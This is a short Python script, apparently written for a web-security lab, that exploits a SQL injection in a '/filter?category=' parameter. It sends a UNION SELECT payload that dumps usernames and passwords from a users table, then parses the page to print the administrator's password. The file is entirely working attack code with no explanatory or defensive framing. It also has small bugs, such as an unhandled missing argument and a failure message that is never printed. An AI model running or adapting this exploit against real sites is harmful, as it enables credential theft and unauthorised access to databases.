import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def expoilt_sqli_username_password(url):
    print("OK")
    path = "/filter?category="
    sql_payload = "' UNION SELECT NULL , username|| '-' ||password FROM users--"
    req = requests.get(url+path+sql_payload , verify=False,proxies=proxies)
    res = req.text
    if "administrator" in res:
        print("Found administrator passworde Paresing...")
        soup = BeautifulSoup(res,'html.parser')
        admin_password = soup.find(string=re.compile('.*administrator.*')).split("-")[1]
        print("administrator passworde: " + admin_password)
        return True
    else:
        return False  


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    expilt_sql_users_tabel = expoilt_sqli_username_password(url)
    if not expilt_sql_users_tabel:
        "did not find admin"
    
